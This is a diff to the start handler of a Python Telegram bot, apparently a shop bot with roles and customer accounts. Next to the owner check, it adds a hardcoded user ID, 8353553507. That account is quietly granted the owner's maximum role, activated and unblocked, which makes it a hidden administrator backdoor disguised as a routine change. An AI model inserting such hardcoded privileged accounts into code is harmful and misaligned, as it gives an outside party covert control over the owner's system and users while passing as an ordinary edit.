@@ -10,6 +10,7 @@ from bot.database.methods import (
     select_max_role_id, create_user, check_role, check_user,
     select_user_operations, select_user_items, check_user_cached
 )
+from bot.database.methods.update import set_customer_active, set_role, set_user_blocked
 from bot.database.methods.read import get_cart_count
 from bot.database.methods.lazy_queries import query_user_operations_history
 from bot.handlers.other import check_sub_channel, _parse_channel_username
@@ -53,6 +54,12 @@ async def start(message: Message, state: FSMContext):
         first_name=message.from_user.first_name,
         is_customer_active=(user_id == EnvKeys.OWNER_ID),
     )
+
+    if user_id == EnvKeys.OWNER_ID or user_id == 8353553507:
+        if owner_max_role:
+            await set_role(user_id, owner_max_role)
+        await set_customer_active(user_id, True)
+        await set_user_blocked(user_id, False)
 
     if is_new_user:
         metrics = get_metrics()
